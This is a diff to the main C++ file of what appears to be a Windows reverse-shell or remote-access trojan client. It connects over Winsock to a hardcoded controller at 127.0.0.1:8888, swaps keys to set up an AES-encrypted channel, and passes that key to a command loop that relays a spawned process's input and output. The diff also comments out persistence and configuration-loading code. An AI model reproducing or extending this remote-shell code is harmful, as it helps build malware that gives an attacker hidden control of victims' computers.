@@ -1,11 +1,17 @@
 #include <iostream>
 #include <string>
-#include <filesystem>
 #include "include/socketconnection.h"
-#include "include/persist.h"
+/* #include "include/persist.h" */
 #include "include/keys.h"
+#include "include/crypto.h"
 
 int main() {
+    std::string keyAes;
+
+
+
+
+
 /*     std::filesystem::path appdata_path = getAppDataPath();
 
     if (appdata_path.empty()) {
@@ -68,7 +74,7 @@ int main() {
 
 
     // ---------- CONNECTION INFO ----------
-    if (fileExist(conf_path)) {
+/*     if (fileExist(conf_path)) {
         // load configuration parameters
         auto config = loadConfig(conf_path);
         
@@ -80,15 +86,18 @@ int main() {
             return 1;
         }
     }
-
+ */
 
     // ---------- CONNECTION ----------
-    //const std::string ip = "127.0.0.1";
-    //const int port = 8888;
+    const std::string ip = "127.0.0.1";
+    const int port = 8888;
 
     if (!initWinsock()) return 1;
     SOCKET s = connectToServer(ip, port);
     if (s == INVALID_SOCKET) return 1;
+    keyAes = send_keys(s);
+
+
 
 
 
@@ -102,7 +111,7 @@ int main() {
         return 1;
     }
 
-    commandLoop(s, hReadOut, hWriteIn, ip, port);
+    commandLoop(s, hReadOut, hWriteIn, ip, port, keyAes);
     cleanup(s, hReadOut, hWriteIn, pi);
     return 0;
 }
